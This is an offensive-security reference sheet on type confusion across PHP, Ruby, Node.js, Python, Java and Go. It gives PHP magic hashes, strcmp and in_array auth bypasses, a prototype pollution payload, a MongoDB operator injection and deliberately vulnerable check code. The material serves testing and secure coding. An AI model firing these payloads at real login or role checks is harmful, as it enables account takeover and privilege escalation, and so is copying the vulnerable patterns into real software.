# Type Confusion Techniques by Language

## PHP (Highest Value Target)

PHP's loose comparison (`==`) and implicit type coercion make it the richest type confusion surface.

**Loose comparison table (critical entries):**

| Expression | Result | Why |
|-----------|--------|-----|
| `"0" == false` | true | String "0" is falsy |
| `"" == false` | true | Empty string is falsy |
| `"0e123" == "0e456"` | true | Both parse as 0 in scientific notation |
| `"0e123" == 0` | true | Scientific notation string == 0 |
| `[] == false` | true | Empty array is falsy |
| `"php" == 0` | true (PHP < 8.0) | Non-numeric string coerces to 0 |

**Magic hash bypass:**
```php
// Known "magic" hashes that == "0":
// MD5("240610708")  = "0e462097431906509019562988736854"
// MD5("QNKCDZO")   = "0e830400451993494058024219903391"
// SHA1("aaroZmOk")  = "0e66507019969427134894567494305185566735"
```

**Array injection:**
```php
// strcmp(array, string) returns NULL
// NULL == 0 -> true -> auth bypass
$password = $_POST['password'];  // attacker sends password[]=anything
if (strcmp($password, $stored) == 0) { login(); }

// in_array without strict
if (in_array($role, ['admin', 'moderator'])) { grant(); }
// $role = true -> in_array(true, ['admin']) -> true
```

**JSON type injection:**
```json
// {"password": true} -> true == "secret123" -> true (PHP loose)
// {"otp": 123456} -> int vs string comparison
// {"id": ["42", "99"]} -> array in SQL query
```

## Ruby

**Mass assignment with type confusion:**
```ruby
# GitLab CVE (password reset):
# POST /users/password
# user[email][]=victim@example.com&user[email][]=attacker@example.com
# App validates first email, sends reset to both
```

## JavaScript / Node.js

**Express.js query parsing:**
```javascript
// ?role=admin    -> req.query.role = "admin"  (string)
// ?role[]=admin  -> req.query.role = ["admin"] (array)
// String "user".includes("adm") -> false
// Array ["user", "admin"].includes("admin") -> true
```

**Prototype pollution via type confusion:**
```javascript
// {"role": "user", "__proto__": {"isAdmin": true}}
// Recursive merge functions (lodash.merge, deep-extend) DO pollute
// After pollution: ({}).isAdmin -> true for ALL new objects
```

**parseInt / Number coercion:**
```javascript
parseInt("123abc")  // 123 (stops at first non-digit)
Number("")          // 0 (empty string -> 0)
Number(null)        // 0
Number([])          // 0 ([] -> "" -> 0)
Number([5])         // 5
```

## Python

```python
# VULNERABLE: truthy check instead of type check
if data.get('admin'):  # True for any truthy value
    grant_admin()
# Attack: {"admin": 1}, {"admin": "yes"}, {"admin": [1]}

# NoSQL operator injection
# {"password": {"$gt": ""}} -> MongoDB: always true
```

## Java / Go (Strict but Not Immune)

```java
// String.equals() on null -> NullPointerException
// If exception caught and treated as "skip check" -> bypass
String token = request.getParameter("token");
if (token.equals(expectedToken)) {  // NPE if token is null
    // ... but what does the catch block do?
}
```

```go
// JSON unmarshaling into interface{} loses type info:
var data map[string]interface{}
json.Unmarshal(body, &data)
// data["count"] could be float64, string, bool, nil, []interface{}, map...
// Type assertion without check: data["count"].(string) -> panic
```
